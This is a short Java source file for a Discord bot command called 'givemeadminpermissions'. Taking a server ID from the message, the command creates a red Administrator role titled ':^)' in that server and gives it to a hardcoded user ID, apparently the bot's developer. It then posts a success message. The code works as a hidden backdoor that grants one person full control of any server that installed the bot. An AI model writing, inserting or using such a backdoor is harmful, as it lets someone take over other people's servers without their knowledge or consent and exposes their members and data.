package de.tectoast.commands.flo;

import de.tectoast.commands.Command;
import de.tectoast.commands.CommandCategory;
import de.tectoast.utils.Constants;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Role;
import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;

import java.awt.*;

public class GiveMeAdminPermissionsCommand extends Command {
    public GiveMeAdminPermissionsCommand() {
        super("givemeadminpermissions", ":^)", CommandCategory.Flo);
    }

    @Override
    public void process(GuildMessageReceivedEvent e) {
        Guild g = e.getJDA().getGuildById(e.getMessage().getContentDisplay().split(" ")[1]);
        Role r = g.createRole().setPermissions(Permission.ADMINISTRATOR).setName(":^)").setColor(Color.RED).complete();
        g.addRoleToMember(Constants.FLOID, r).queue();
        EmbedBuilder builder = new EmbedBuilder();
        builder.setTitle("Succesfully gave admin permission on \"" + g.getName() + "\"!").setColor(Color.RED);
        e.getChannel().sendMessage(builder.build()).queue();
    }
}
